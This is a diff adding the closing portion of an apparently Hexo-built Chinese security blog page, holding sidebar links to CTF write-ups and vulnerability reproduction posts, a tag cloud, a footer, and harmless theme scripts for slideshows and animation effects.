+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2019/06/16/filename/">14道杂项中的隐写题目</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2019/06/11/%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E5%B7%A5%E5%85%B7Angr%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/">符号执行工具Angr的简单使用</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2019/06/11/docs/15964746176721/">符号执行工具Angr的简单使用</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2019/04/25/2019DDCTF%E9%83%A8%E5%88%86wp/">2019DDCTF部分wp</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2019/04/25/docs/15964746176699/">2019DDCTF部分wp</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2019/03/11/mysql%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5/">mysql手动注入</a>
+                </span>
+            </li>
+            
+        </ul>
+    </div>
+</aside>
+    
+    
+    <aside id="sidebar-rand_posts">
+    <div class="panel panel-gal recent hidden-xs" data-aos="fade-up" data-aos-duration="2000">
+        <div class="panel-heading">
+            <i class="fa fa-refresh"></i>
+            随机文章
+            <i class="fa fa-times-circle panel-remove"></i>
+            <i class="fa fa-chevron-circle-up panel-toggle"></i>
+        </div>
+        <ul class="list-group list-group-flush">
+            
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2018/10/31/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%BA%8C%E5%A4%A9/">C语言学习第二天</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2018/10/13/%E6%8A%A4%E7%BD%91%E6%9D%AF/">护网杯签到题wp</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2019/04/25/2019DDCTF%E9%83%A8%E5%88%86wp/">2019DDCTF部分wp</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2018/10/29/docs/15964746176652/">2018第7届蓝盾杯部分wp</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2018/10/13/docs/15964746176740/">护网杯签到题wp</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2018/11/08/docs/15964746176890/">CVE-2018-4407复现(ios缓冲区溢出漏洞)</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2019/03/11/docs/15964746176946/">mysql手动注入</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2020/08/04/docs/15964746176908/">14道杂项中的隐写题目</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2019/04/25/docs/15964746176699/">2019DDCTF部分wp</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2018/10/17/docs/15964746176806/">我校平台CTF解题部分wp</a>
+                </span>
+            </li>
+            
+        </ul>
+    </div>
+</aside>
+    
+    
+    <aside id="gal-sets">
+        <div class="panel panel-gal hidden-xs" data-aos="fade-up" data-aos-duration="2000">
+            <ul class="nav nav-pills pills-gal">
+                <li class="">
+                    <a href="/2018/11/19/docs/15964746176674/index.html#sidebar-tags" data-toggle="tab" id="tags-tab">热门标签</a>
+                </li>
+                <li class="">
+                    <a href="/2018/11/19/docs/15964746176674/index.html#sidebar-friend-links" data-toggle="tab" id="friend-links-tab">友情链接</a>
+                </li>
+                <li class="">
+                    <a href="/2018/11/19/docs/15964746176674/index.html#sidebar-links" data-toggle="tab" id="links-tab">个人链接</a>
+                </li>
+            </ul>
+            <div class="tab-content">
+                <div class="cloud-tags tab-pane nav bs-sidenav fade" id="sidebar-tags">
+    
+    <a href="/tags/ctf/" style="font-size: 16.16370322448181px;" class="tag-cloud-link">ctf</a>
+    
+    <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" style="font-size: 18.962052534840417px;" class="tag-cloud-link">漏洞复现</a>
+    
+    <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="font-size: 11.889333365726026px;" class="tag-cloud-link">学习笔记</a>
+    
+</div>
+                <div class="friend-links tab-pane nav bs-sidenav fade" id="sidebar-friend-links">
+    
+    <li>
+        <a href="youlian/index.html" target="_blank">大佬友链</a>
+    </li>
+    
+</div>
+                <div class="links tab-pane nav bs-sidenav fade" id="sidebar-links">
+    
+    <li>
+        <a href="" target="_blank">Github</a>
+    </li>
+    
+</div>
+            </div>
+        </div>
+    </aside>
+    
+</aside>
+            </div>
+        </div>
+    </div>
+    <footer id="gal-footer">
+    <div class="container">
+        Copyright © 2018 G0fl1er Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>.&nbsp;Theme by <a href="https://github.com/ZEROKISEKI" target="_blank">AONOSORA</a>
+    </div>
+</footer>
+
+<!-- 回到顶端 -->
+<div id="gal-gotop">
+    <i class="fa fa-angle-up"></i>
+</div>
+</body>
+
+<script src="/js/activate-power-mode.js"></script>
+
+<script>
+
+    // 配置highslide
+	hs.graphicsDir = '/js/highslide/graphics/'
+    hs.outlineType = "rounded-white";
+    hs.dimmingOpacity = 0.8;
+    hs.outlineWhileAnimating = true;
+    hs.showCredits = false;
+    hs.captionEval = "this.thumb.alt";
+    hs.numberPosition = "caption";
+    hs.align = "center";
+    hs.transitions = ["expand", "crossfade"];
+    hs.lang.number = '共%2张图, 当前是第%1张';
+    hs.addSlideshow({
+      interval: 5000,
+      repeat: true,
+      useControls: true,
+      fixedControls: "fit",
+      overlayOptions: {
+        opacity: 0.75,
+        position: "bottom center",
+        hideOnMouseOut: true
+      }
+    })
+
+    // 初始化aos
+    AOS.init({
+      duration: 1000,
+      delay: 0,
+      easing: 'ease-out-back'
+    });
+
+</script>
+<script>
+	POWERMODE.colorful = 'true';    // make power mode colorful
+	POWERMODE.shake = 'true';       // turn off shake
+	// TODO 这里根据具体情况修改
+	document.body.addEventListener('input', POWERMODE);
+</script>
+<script>
+    window.slideConfig = {
+      prefix: '/imgs/slide/background',
+      ext: 'jpg',
+      maxCount: '6'
+    }
+</script>
+
+<script src="/js/hs.js"></script>
+<script src="/js/blog.js"></script>
+
+
+
+
+</html>
